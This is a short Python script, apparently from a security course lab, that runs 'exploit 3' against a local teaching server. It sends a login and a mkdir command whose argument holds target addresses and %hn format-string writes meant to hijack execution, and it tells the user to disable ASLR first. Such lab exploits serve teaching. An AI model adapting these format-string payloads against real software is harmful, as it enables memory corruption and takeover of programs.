#!/usr/bin/env python3

"""Script to run exploit 3.

Instructions: `make` the project, open a shell, disable ASLR, run this script.

To disable ASLR, run the following command in the shell:
    setarch `uname -m` -R /bin/bash

This script requires Python 3.6 or higher."""


import pathlib
import sys


# `HERE` is the directory this script is located in.
HERE = pathlib.Path(__file__).resolve().parent


def main():
    """Run the exploit."""

    print("Exploit 3 should run the hijack function...")
    print("ASLR needs to be disabled for this exploit:")
    print("setarch `uname -m` -R /bin/bash")

    sys.path.append(str(HERE.parent))
    import exploitlib

    exploit = b'login Acidburn\n'
    exploit += b'pass CrashOverride\n'
    exploit += b'mkdir ---\xec\x76\xff\xf7\xed\x76\xff\xf7\xee\x76\xff\xf7'
    exploit += b'\xef\x76\xff\xf7%63u%17$hn%68u%18$hn%70u%19$hn...%20$hn\n'
    exploit += b'ls\n'
    exploitlib.run(exploit_bytes=exploit)

    print("If you don't see 'Method hijack: Accepted' above:")
    print("Perhaps you need to disable ASLR")


if __name__ == '__main__':
    main()
